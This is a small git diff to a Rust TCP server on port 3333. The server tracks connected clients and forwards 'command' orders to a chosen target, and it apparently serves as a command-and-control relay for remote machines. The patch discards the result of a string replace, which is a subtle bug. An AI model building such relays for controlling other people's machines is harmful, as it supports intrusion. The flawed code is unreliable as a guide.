@@ -14,13 +14,15 @@ fn is_zero(buf: &[u8]) -> bool {
 unsafe fn orders_manage(commands:Vec<&str>, mut stream:TcpStream){
    //let mut ONLINE =HASHMAP.lock().expect("unable to lock mutex");
     if commands[0]=="command"{
-        let comm =commands[1].replace("target", "");
+        commands[1].replace("target", "");
+        let comm =commands[0].to_owned()+" "+commands[1];
         let target = commands[2];
         println!("{} {}",comm,target);
         for key in ONLINE.iter() {
             if key.0==target{
                 let mut target_stream:TcpStream=key.1.try_clone().unwrap();
                 target_stream.write(comm.as_bytes()).unwrap();
+                target_stream.write(b"\n").unwrap();
 
             }
         }
@@ -106,6 +108,7 @@ fn register(stream: &str){
     }{}
 
  }
+
 fn main() {
     let listener = TcpListener::bind("0.0.0.0:3333").unwrap();
     // accept connections and process them, spawning a new thread for each one
